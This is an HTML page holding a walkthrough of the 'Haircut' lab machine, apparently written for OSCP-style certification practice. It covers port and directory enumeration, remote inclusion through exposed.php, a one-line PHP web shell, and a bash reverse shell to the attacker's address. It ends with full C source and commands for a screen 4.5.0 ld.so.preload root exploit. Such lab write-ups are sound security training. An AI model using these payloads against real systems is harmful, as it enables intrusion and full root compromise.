@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="h-full">
+   <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Envertex | Haircut</title>
+      <meta name="description" content="Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications. Filter by difficulty, OS, and certification.">
+      <meta name="author" content="Your Name">
+      <meta name="robots" content="index, follow">
+      <!-- OpenGraph -->
+      <meta property="og:type" content="website">
+      <meta property="og:title" content="Envertex Machines">
+      <meta property="og:description" content="Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications.">
+      <meta property="og:url" content="https://envertex.github.io/machines/machines.html">
+      <meta property="og:site_name" content="Envertex Lab">
+      <meta property="og:image" content="https://envertex.github.io/images/profile.png">
+      <meta property="og:image:width" content="1200">
+      <meta property="og:image:height" content="630">
+      <!-- Twitter -->
+      <meta name="twitter:card" content="summary_large_image">
+      <meta name="twitter:title" content="Envertex Machines">
+      <meta name="twitter:description" content="Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications.">
+      <meta name="twitter:image" content="https://envertex.github.io/images/profile.png">
+      <!-- Schema.org JSON-LD -->
+      <script type="application/ld+json">
+         {
+           "@context": "https://schema.org",
+           "@type": "WebPage",
+           "name": "Envertex Machines",
+           "description": "Explore cybersecurity labs and machines for OSCP, OSEP, and other certifications.",
+           "url": "https://envertex.github.io/machines/machines.html",
+           "author": {
+             "@type": "Person",
+             "name": "Your Name",
+             "email": "your.email@example.com"
+           },
+           "publisher": {
+             "@type": "Organization",
+             "name": "Envertex",
+             "logo": {
+               "@type": "ImageObject",
+               "url": "https://envertex.github.io/images/profile.png"
+             }
+           }
+         }
+      </script>
+      <!-- Fonts -->
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+      <!-- CSS -->
+      <link rel="stylesheet" href="/css/theme.min.f1ceb355b0c4c1df17e287a25fb4c6379b07e40c5d26feac7fa2500f0a37cb75.css">
+      <link rel="stylesheet" href="/css/syntax-dark.min.b01037e5609e6260b74d6fcdd6d5131e8dcbc4d46d6ef4bfbe5a60bdfc1a9f30.css" id="syntax-dark-theme" class="syntax-theme">
+      <link rel="stylesheet" href="/css/syntax-light.min.9602bc2fcef52b4c62e05eae14b48ba428e114f116e993e504d83ed5a3aeda98.css" id="syntax-light-theme" class="syntax-theme" disabled>
+      <link rel="stylesheet" href="/css/bundle.min.82559bd59b12235c47e448881d968913485f1bccd9e6c7104066c2e3f1d92bbb.css">
+      <!-- Favicon -->
+      <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/envertex/images/refs/heads/main/favicon.ico">
+      <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/envertex/images/refs/heads/main/favicon.ico">
+      <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/envertex/images/refs/heads/main/favicon.ico">
+      <!-- Theme Switcher -->
+      <script>
+         (function() {
+           const storedTheme = localStorage.getItem('theme');
+           const systemPrefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+           const theme = storedTheme || (systemPrefersLight ? 'light' : 'dark');
+           document.documentElement.setAttribute('data-theme', theme);
+         
+           const syntaxDark = document.getElementById('syntax-dark-theme');
+           const syntaxLight = document.getElementById('syntax-light-theme');
+           if (theme === 'light') { syntaxDark.disabled = true; syntaxLight.disabled = false; } 
+           else { syntaxDark.disabled = false; syntaxLight.disabled = true; }
+         
+           const observer = new MutationObserver(() => {
+             const currentTheme = document.documentElement.getAttribute('data-theme');
+             if (currentTheme === 'light') { syntaxDark.disabled = true; syntaxLight.disabled = false; } 
+             else { syntaxDark.disabled = false; syntaxLight.disabled = true; }
+           });
+           observer.observe(document.documentElement, { attributes: true, attributeFilter: ['data-theme'] });
+         })();
+      </script>
+   </head>
+   <body class="flex flex-col min-h-screen">
+      <a href="#main-content" class="skip-to-main">Skip to main content</a>
+      <!-- Header -->
+      <header class="sticky-header">
+         <div class="header-container">
+            <nav class="header-nav" aria-label="Main navigation">
+               <div class="header-content">
+                  <div class="header-logo">
+                     <a href="/" class="logo-link">✦ Envertex</a>
+                  </div>
+                  <div class="header-menu">
+                     <ul class="menu-list">
+                        <li class="menu-item"><a href="../index.html" class="menu-link">Home</a></li>
+                        <li class="menu-item"><a href="/posts/posts.html" class="menu-link">Posts</a></li>
+                        <li class="menu-item"><a href="/notes/notes.html" class="menu-link">Notes</a></li>
+                        <li class="menu-item"><a href="/machines/machines.html" class="menu-link active">Machines</a></li>
+                        <li class="menu-item"><a href="/about/about.html" class="menu-link">About</a></li>
+                     </ul>
+                     <button id="search-toggle" class="search-toggle" aria-label="Search">
+                        <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                        </svg>
+                     </button>
+                     <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">
+                        <svg class="icon-sun" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
+                        </svg>
+                        <svg class="icon-moon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
+                        </svg>
+                     </button>
+                  </div>
+               </div>
+            </nav>
+         </div>
+      </header>
+      <main id="main-content" class="post-vertex-main" role="main" style="display:flex; gap:2rem; max-width:1200px; margin:0 auto; padding:2rem 1rem;">
+         <!-- TOC lateral fijo -->
+         <aside id="post-toc" class="post-vertex-toc" style="
+            position: sticky;
+            top: calc( var(--header-height, 80px) + 1rem ); /* ajusta según tu header */
+            flex-shrink: 0;
+            width: 250px;
+            align-self: flex-start;
+            ">
+            <h2 class="post-vertex-toc-title">Contents</h2>
+            <nav class="post-vertex-toc-nav">
+               <ul>
+                  <!-- Se llenará automáticamente -->
+               </ul>
+            </nav>
+         </aside>
+         <!-- Main content -->
+         <article class="post-vertex-article" style="flex:1; min-width:0;">
+            <header class="post-vertex-header">
+               <h1 class="post-vertex-title">
+                  Haircut
+               </h1>
+               <div class="post-vertex-meta">
+                  <span class="post-vertex-reading" datetime="2026-01-06">
+                  </span>
+               </div>
+               <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/haircut/main.png"/>
+            </header>
+            <div class="post-vertex-content">
+               <h2 id="general-information">
+                  General Information
+               </h2>
+               <p>
+                  This section summarizes the basic context of the target machine, including relevant technical details that help understand the environment before starting the enumeration and exploitation process.
+               </p>
+               <ul>
+                  <li><strong>IP:</strong> 10.129.65.98</li>
+                  <li><strong>Operating System:</strong> Linux (Ubuntu)</li>
+                  <li><strong>Web Server:</strong> nginx 1.10.0</li>
+                  <li><strong>Backend Language:</strong> PHP</li>
+               </ul>
+               <p>
+                  The machine mainly exposes a web service over HTTP, which directs the initial attack toward web application–level enumeration and exploitation techniques.
+               </p>
+            
+               <h2 id="enumeration">
+                  Enumeration
+               </h2>
+               <h3 id="port-and-service-scanning">
+                  Port and service scanning
+               </h3>
+               <p>
+                  The enumeration phase focuses on thoroughly understanding the attack surface exposed by the target machine. The goal is not only to identify open services, but also to understand how they may relate to each other in order to build a viable compromise vector.
+               </p>
+               <p>
+                  The first step is to perform a full TCP port scan. For this, nmap is used with a configuration optimized for speed and reliability, disabling DNS resolution and forcing a high packet rate. This allows quick identification of which services are externally accessible.
+               </p>
+               <pre><code class="lang-bash">sudo nmap -p- -sS -Pn -n --open --min-rate 6500 --max-retries 1 --initial-rtt-timeout 100ms --max-rtt-timeout 300ms -T4 10.129.65.98 -oG allPortsTCP
+</code></pre>
+               <p>
+                  <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/haircut/img1.png"/>
+               </p>
+               <p>
+                  Once open ports are detected, a more targeted scan is performed against the identified services. This second scan retrieves service versions, banners, and runs basic scripts to better understand the system context.
+               </p>
+               <pre><code class="lang-bash">nmap -p22,80 -sCV 10.129.65.98 -oN infoPortsTCP
+</code></pre>
+               <p>
+                  <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/haircut/img2.png"/>
+               </p>
+               <h3 id="web-and-directory-enumeration">
+                  Web and directory enumeration
+               </h3>
+               <p>
+                  The results show an SSH service and a web server listening on port 80. When accessing the website, only a static image with no apparent functionality is displayed. No forms, links, or dynamic content are identified that allow direct interaction.
+               </p>
+               <p>
+                  <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/haircut/img3.png"/>
+               </p>
+               <p>
+                  Even though the main page does not provide useful information, this does not mean the web server lacks interesting resources. For this reason, active enumeration continues using directory brute forcing to discover hidden or unlinked paths.
+               </p>
+               <pre><code class="lang-bash">gobuster dir -u http://10.129.65.98/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -t 200
+</code></pre>
+               <p>
+                  The scan results are limited, but reveal two relevant paths: <code>index.html</code> and the <code>uploads</code> directory. The latter is particularly interesting, as it is often associated with file upload or storage functionality, potentially opening the door to remote write attacks.
+               </p>
+               <h3 id="technologies-and-exposed-files">
+                  Technologies and exposed files
+               </h3>
+               <p>
+                  To complement the information gathered, the technologies used by the web server are identified. This helps confirm the technology stack and better guide the next attack steps.
+               </p>
+               <pre><code class="lang-bash">whatweb http://10.129.65.98
+</code></pre>
+               <p>
+                  The analysis confirms that the server is running nginx on Ubuntu and that the backend uses PHP. With this information, it makes sense to search for existing PHP files that are not directly exposed through normal navigation.
+               </p>
+               <pre><code class="lang-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u http://10.129.65.98/FUZZ.php -t 200
+</code></pre>
+               <p>
+                  This process identifies the <code>exposed.php</code> file. Although it is not linked from visible content, its existence suggests an internal functionality that may be exploitable.
+               </p>
+               <p>
+                  <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/haircut/img4.png"/>
+               </p>
+               <h2 id="exploitation">
+                  Exploitation
+               </h2>
+               <h3 id="remote-inclusion-identification">
+                  Remote inclusion identification
+               </h3>
+               <p>
+                  With <code>exposed.php</code> identified, the next step is to analyze its behavior. When interacting with it, it is observed that it accepts a parameter that allows loading external resources. This behavior is typical of remote inclusion vulnerabilities if proper controls are not implemented.
+               </p>
+               <p>
+                  To validate this hypothesis, a simple HTML file is created on the attacker machine and loaded through the vulnerable parameter. The initial goal is not code execution, but to confirm that the server fetches and renders external content.
+               </p>
+               <pre><code class="lang-html">&lt;h1&gt;envertex pwned!&lt;/h1&gt;
+</code></pre>
+               <p>
+                  When making the corresponding request from the browser, the external content is correctly displayed in the server response. This confirms that remote inclusion is possible and that the server trusts attacker-controlled resources.
+               </p>
+               <p>
+                  <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/haircut/img5.png"/>
+               </p>
+               <h3 id="remote-command-execution">
+                  Remote command execution
+               </h3>
+               <p>
+                  Once inclusion is confirmed, the logical next step is to attempt code execution on the server. To do this, the HTML file is replaced with a PHP script that allows system command execution via GET parameters.
+               </p>
+               <pre><code class="lang-php">&lt;?php system($_GET['cmd']); ?&gt;
+</code></pre>
+               <p>
+                  Since the <code>uploads</code> directory was identified during enumeration, it is inferred that the remote resource will be stored there when making the request with output redirection. This allows later direct access to the PHP file from the target server.
+               </p>
+               <pre><code>http://10.10.14.194/cmd.php -o uploads/cmd.php
+</code></pre>
+               <p>
+                  Remote command execution is validated by running <code>whoami</code> from the browser, confirming that the code executes with <code>www-data</code> privileges.
+               </p>
+               <p>
+                  <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/haircut/img6.png"/>
+               </p>
+               <h3 id="reverse-shell-obtainment">
+                  Reverse shell obtainment
+               </h3>
+               <p>
+                  With command execution confirmed, a reverse shell is established to gain a more stable interactive session. This facilitates local enumeration and privilege escalation.
+               </p>
+               <pre><code class="lang-bash">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.194/443 0&gt;&amp;1'
+</code></pre>
+               <p>
+                  The connection is successfully received on the attacker machine, granting access as <code>www-data</code>. From this context, it is possible to access the home directory of the user <code>maria</code> and read the user flag.
+               </p>
+               <pre><code class="lang-bash">cat /home/maria/user.txt
+</code></pre>
+               <h2 id="privilege-escalation">
+                  Privilege Escalation
+               </h2>
+               <h3 id="suid-binary-enumeration">
+                  SUID binary enumeration
+               </h3>
+               <p>
+                  With initial access obtained, the final phase consists of escalating privileges to root. This starts by enumerating binaries with the SUID bit set, as they run with elevated privileges and are a common escalation vector.
+               </p>
+               <pre><code class="lang-bash">find / -perm -4000 -type f 2&gt;/dev/null
+</code></pre>
+               <p>
+                  Among the discovered binaries, <code>/usr/bin/screen-4.5.0</code> stands out. This specific version of screen is known to be vulnerable and has public exploits that allow root-level execution.
+               </p>
+               <h3 id="screen-vulnerability-analysis">
+                  Screen vulnerability analysis
+               </h3>
+               <p>
+                  When researching this version, a technique abusing the <code>LD_PRELOAD</code> variable is identified to force the loading of a malicious shared library. This library executes with elevated privileges when screen is invoked in a specific way.
+               </p>
+               <p>
+                  During manual exploit implementation, a relevant error appears when attempting to compile the shared library:
+               </p>
+               <pre><code class="lang-bash">gcc: error trying to exec 'cc1': execvp: No such file or directory
+</code></pre>
+               <p>
+                  This error is not related to the exploit itself, but to the environment of the <code>www-data</code> user. The limited PATH prevents gcc from correctly locating its internal components. Understanding this detail is crucial, as privilege escalation fails if it is not resolved.
+               </p>
+               <h3 id="exploitation-and-root-access">
+                  Exploitation and root access
+               </h3>
+               <p>
+                  Once the environment is adjusted, a malicious shared library is created. Its purpose is to modify the permissions of a binary that will act as a root shell and clean the <code>ld.so.preload</code> file to avoid system instability.
+               </p>
+               <pre><code class="lang-c">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+  chown("/tmp/rootshell", 0, 0);
+  chmod("/tmp/rootshell", 04755);
+  unlink("/etc/ld.so.preload");
+  printf("[+] done!\n");
+}
+</code></pre>
+               <p>
+                  In parallel, a simple binary is compiled whose sole purpose is to spawn a shell with UID and GID 0.
+               </p>
+               <pre><code class="lang-c">#include &lt;stdio.h&gt;
+int main(void){
+  setuid(0);
+  setgid(0);
+  seteuid(0);
+  setegid(0);
+  execvp("/bin/sh", NULL);
+}
+</code></pre>
+               <p>
+                  Exploitation is completed by using screen to write into <code>ld.so.preload</code> and force the loading of the malicious library.
+               </p>
+               <pre><code class="lang-bash">cd /etc
+umask 000
+screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+</code></pre>
+               <p>
+                  Finally, executing the generated binary yields a root shell. This allows access to the <code>/root</code> directory and reading the final flag, completing full system compromise.
+               </p>
+               <pre><code class="lang-bash">/tmp/rootshell
+cat /root/root.txt
+</code></pre>
+            </div>
+         </article>
+      </main>
+      <script>
+         document.addEventListener('DOMContentLoaded', () => {
+           const content = document.querySelector('.post-vertex-content');
+           const tocNav = document.querySelector('.post-vertex-toc-nav ul');
+           if (!content || !tocNav) return;
+         
+           const headers = content.querySelectorAll('h2, h3');
+         
+           headers.forEach(header => {
+             if (!header.id) {
+               header.id = header.textContent.trim().toLowerCase()
+                 .replace(/\s+/g, '-')
+                 .replace(/[^\w\-]/g, '');
+             }
+           });
+         
+           let currentUlH2 = null;
+         
+           headers.forEach(header => {
+             if (header.tagName.toLowerCase() === 'h2') {
+               const li = document.createElement('li');
+         
+               const wrapper = document.createElement('div');
+               wrapper.style.display = 'inline-flex';
+               wrapper.style.alignItems = 'center';
+               wrapper.style.gap = '0.3rem';
+         
+               const toggle = document.createElement('span');
+               toggle.textContent = '▸';
+               toggle.style.userSelect = 'none';
+               toggle.style.fontWeight = 'bold';
+               toggle.style.cursor = 'pointer';
+         
+               const a = document.createElement('a');
+               a.href = `#${header.id}`;
+               a.textContent = header.textContent;
+               a.style.textDecoration = 'none';
+               a.style.fontWeight = 'bold';
+               a.style.color = 'var(--text-primary)';
+         
+               wrapper.appendChild(toggle);
+               wrapper.appendChild(a);
+               li.appendChild(wrapper);
+         
+               const ulH3 = document.createElement('ul');
+               ulH3.style.display = 'none';
+               ulH3.style.paddingLeft = '1.5rem';
+               li.appendChild(ulH3);
+         
+               wrapper.addEventListener('click', () => {
+                 if (ulH3.style.display === 'none') {
+                   ulH3.style.display = 'block';
+                   toggle.textContent = '▾';
+                 } else {
+                   ulH3.style.display = 'none';
+                   toggle.textContent = '▸';
+                 }
+                 document.getElementById(header.id).scrollIntoView({ behavior: 'smooth' });
+               });
+         
+               tocNav.appendChild(li);
+               currentUlH2 = ulH3;
+         
+             } else if (header.tagName.toLowerCase() === 'h3' && currentUlH2) {
+               const li = document.createElement('li');
+               li.style.marginBottom = '0.25rem';
+         
+               const a = document.createElement('a');
+               a.href = `#${header.id}`;
+               a.textContent = header.textContent;
+               a.style.textDecoration = 'none';
+               a.style.fontWeight = 'normal';
+               a.style.color = 'var(--text-muted)';
+         
+               a.addEventListener('click', e => {
+                 e.preventDefault();
+                 document.getElementById(header.id).scrollIntoView({ behavior: 'smooth' });
+               });
+         
+               li.appendChild(a);
+               currentUlH2.appendChild(li);
+             }
+           });
+         });
+         document.addEventListener("DOMContentLoaded", () => {
+         
+           const content = document.querySelector(".post-vertex-content");
+           const metaLine = document.querySelector(".post-vertex-reading");
+         
+           if (!content || !metaLine) return;
+         
+           /* =========================
+              FECHA
+           ========================= */
+           const rawDate = metaLine.getAttribute("datetime");
+           let formattedDate = "";
+         
+           if (rawDate) {
+             const date = new Date(rawDate);
+             formattedDate = date.toLocaleDateString("en-US", {
+               day: "numeric",
+               month: "long",
+               year: "numeric"
+             });
+           }
+         
+           /* =========================
+              CONTAR PALABRAS (SIN IMÁGENES)
+           ========================= */
+           const clone = content.cloneNode(true);
+         
+           clone.querySelectorAll("img, svg, video, iframe").forEach(el => el.remove());
+         
+           const text = clone.innerText
+             .replace(/\s+/g, " ")
+             .trim();
+         
+           const words = text ? text.split(" ").length : 0;
+         
+           /* =========================
+              TIEMPO DE LECTURA
+           ========================= */
+           const wordsPerMinute = 200;
+           const readingTime = Math.max(1, Math.ceil(words / wordsPerMinute));
+         
+           /* =========================
+              SALIDA FINAL (UNA SOLA LÍNEA)
+           ========================= */
+           metaLine.textContent =
+             `${formattedDate} • ${words.toLocaleString()} words • ${readingTime} min read`;
+         });
+         
+         
+      </script>
+      <footer>
+         <footer class="site-footer">
+            <div class="footer-content">
+               <p class="footer-text">
+                  &copy; 2026 Your Site Title. 
+               </p>
+               <div class="footer-social">
+                  <div class="social-links">
+                     <a href="https://github.com/yourusername" target="_blank" rel="noopener noreferrer" class="social-link" aria-label="GitHub">
+                        <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                           <path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path>
+                        </svg>
+                     </a>
+                     <a href="https://www.linkedin.com/in/yourprofile" target="_blank" rel="noopener noreferrer" class="social-link" aria-label="LinkedIn">
+                        <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                           <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path>
+                        </svg>
+                     </a>
+                     <a href="mailto:your.email@example.com" class="social-link" aria-label="Email">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
+                        </svg>
+                     </a>
+                  </div>
+               </div>
+            </div>
+         </footer>
+      </footer>
+      <div id="search-modal" class="search-modal" aria-hidden="true" role="dialog" aria-label="Search">
+         <div class="search-modal-backdrop" id="search-modal-backdrop"></div>
+         <div class="search-modal-container">
+            <div class="search-input-wrapper">
+               <svg class="search-input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+               </svg>
+               <input 
+                  type="search" 
+                  id="search-input" 
+                  class="search-input" 
+                  placeholder="Search..." 
+                  autocomplete="off"
+                  aria-label="Search input"
+                  >
+               <button class="search-input-clear" id="search-input-clear" aria-label="Clear search">
+                  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                  </svg>
+               </button>
+               <button class="search-modal-close" id="search-modal-close" aria-label="Close search">
+                  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                  </svg>
+               </button>
+            </div>
+            <div id="search-results" class="search-results"></div>
+         </div>
+      </div>
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="yourwidgetid" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <button id="scroll-to-top" class="scroll-to-top" aria-label="Scroll to top" type="button">
+         <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path>
+         </svg>
+      </button>
+      <script src="/js/index.js" defer></script>
+   </body>
+</html>
